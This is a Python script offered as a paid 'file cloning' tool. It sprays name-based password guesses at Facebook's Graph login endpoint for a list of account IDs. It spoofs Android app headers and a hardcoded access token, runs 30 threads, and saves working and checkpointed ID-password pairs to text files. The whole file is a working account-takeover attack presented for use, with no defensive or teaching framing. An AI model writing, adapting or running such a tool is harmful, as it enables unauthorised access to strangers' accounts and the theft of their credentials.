
import os,random,uuid,httpx,json,sys
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted 
#____________[ WOODE ]____________#
def ua():
    fb_versions = ["15.0.0.912", "280.0.0.48.122", "320.0.0.34.95"]
    fb_build_versions = ["3800125", "233235247", "443112334"]
    fb_revision_versions = ["235412020", "341322541", "542334212"]
    carriers = ["airtel", "grameenphone", "robi", "banglalink", "teletalk"]
    user_agent = f"[FBAN/FB4A;FBAV/{random.choice(fb_versions)};FBBV/{random.choice(fb_build_versions)};FBDM/{{density=3.0,width=1080,height=2132}};FBLC/en_US;FBRV/{random.choice(fb_revision_versions)};FBCR/{random.choice(carriers)};FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"    
    return user_agent

loop=0;oks=[];cps=[];tf=[]
#____________[ LINE ]____________#
def line():
    print(48*'\033[1;93m━')
def clear():
    os.system('clear')
    print(logo)
#____________[ LOGO ]____________#
logo=(''' 
\033[1;93m┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
\033[1;93m┃  \033[1;37m┏┓┓┏┏┓┏┓┏┳┓  \033[1;93m┓┏┓┳┳┓┏┓\033[1;91m  ┃ \x1b[38;5;205mNAME \033[1;37m : \033[1;92mWOODE\033[1;93m ┃
\033[1;93m┃  \033[1;37m┃┓┣┫┃┃┗┓ ┃ \033[1;92m━ \033[1;93m┃┫ ┃┃┃┃┓\033[1;93m  ┃ \033[1;92mSTATUS \033[1;37m: \033[1;96mPAID\033[1;93m       ┃
\033[1;93m┃  \033[1;37m┗┛┛┗┗┛┗┛ ┻   \033[1;93m┛┗┛┻┛┗┗┛\033[1;91m  ┃ \033[1;95mGITHUB \033[1;37m: \033[1;92mWoode-Ahmed\033[1;93m  ┃
\033[1;93m┃  \033[1;32m      VERSION \033[1;37m: \033[1;92m1\033[1;37m.\033[1;92m2\033[1;37m.\033[1;92m3  \033[1;93m┃ <\033[1;91m\033[1;41m\033[1;36mFILE   X   RANDOM\033[;0m\033[1;91m\033[1;93m> ┃
\033[1;93m┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
\033[1;93m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[1;93m┃  \033[1;32m TELE \033[1;37m:\033[1;35m NO_BRAK \033[1;93m  ┃
\033[1;93m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;31m
 ''')

#____________[ MAIN - MENU ]____________#
def main():
    os.system('clear')
    print(logo)
    print('\033[1;91m [\033[1;37mA\033[1;91m]\033[1;92m FILE CLONING ')
    print('\033[1;91m [\033[1;37mE\033[1;91m] \033[1;37mEXIT ')
    line()
    option=input(' \033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m CHOICE MENU \033[1;37m:\033[1;33m ')
    if option in ['a','A']:
        __file__()
    else:
        exit(' THANKS FOR USING ')

#____________[ FILE INPUT ]____________#

def __file__():
    os.system('clear')
    print(logo)
    filex=input(' \033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()           
    try:
        pas_limit=int(input(' \033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' \033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Ghost:
        tl=str(len(fo))
        os.system('clear')
        print(logo)
        print('\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m TOTAL ACCOUNT \033[1;37m:\033[1;32m '+tl)
        print('\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Ghost.submit(m1,ids,names,passlist)
    line()
    print('\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m THE PROCESS HAS BEEN COMPLETE')
    print('\033[1;31m[\033[1;37m●\033[1;31m]\033[1;92m THANKS FOR USING OUR TOOL ')
    line()
    input(' PRESS ENTER TO BACK : ')
    main()
#____________[ METHOD - GRAPH ]____________#

def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r \033[1;31m[\033[1;32mFINDING\033[1;31m]\033[1;37m %s\033[1;33m|\033[1;32mOK\033[1;37m:\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': ua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=session.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m[WOODE-OK] '+ids+' | '+pas)
                open('/sdcard/GHOST-GREEN-OK.txt', 'a').write( ids+' | '+pas+' \n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;95m[WOODE-CP] '+ids+' | '+pas)
                open('/sdcard/GHOST-RED-CP.txt', 'a').write( ids+' | '+pas+' \n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

main()